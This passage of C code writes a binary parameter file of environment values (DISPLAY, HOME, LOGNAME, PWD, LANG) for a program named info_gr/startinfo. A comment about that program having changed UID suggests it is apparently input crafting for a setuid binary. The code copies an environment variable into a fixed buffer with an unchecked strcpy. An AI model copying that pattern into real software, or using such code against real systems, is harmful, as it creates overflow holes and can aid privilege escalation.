```
/* DISPLAY (259) */

bzero (buffer,TAILLE_BUFFER) ;
strcpy (buffer, getenv ("DISPLAY")) ;
fwrite (buffer, 1, 259, param) ;

/* LANG (1 C 0 0 0 0 0 0) */

sprintf (buffer, "%c%c%c%c%c%c%c%c%c", 1, 67, 0, 0, 0, 0, 0, 0) ;
fwrite (buffer, 1, 9, param) ;

/* size_$HOME $HOME 0 0 0 */

send_environ (HOME, param) ;

/* size_$LOGNAME $LOGNAME 0 0 0 */

send_environ (LOGIN, param) ;

/* size_$USERNAME $USERNAME 0 0 0 */

send_environ (LOGIN, param) ;

/* size_$PWD $PWD 0 0 0 */

send_environ (PWD, param) ;

/* size_DISPLAY DISPLAY 0 0 0 */

//send_environ (ptsname(0), param) ;

/* If we send our pts, info_gr will crash as it has already
   changed UID */

send_environ ("/dev/null", param) ;

/* It's probably not useful to copy all these environment vars but
   it was good for debugging :) */

sprintf (buffer, "%c%c%c%c", 23, 0, 0, 0) ;
fwrite (buffer, 1, 4, param) ;

sprintf (buffer, "_=./startinfo") ;
send_environ (buffer, param) ;

sprintf (buffer, "TMPDIR=/tmp") ;
send_environ (buffer, param) ;

sprintf (buffer, "LANG=%s", getenv ("LANG")) ;
send_environ (buffer, param) ;
   sprintf (buffer, "LOGIN=%s", LOGIN) ;
   send_environ (buffer, param) ;
```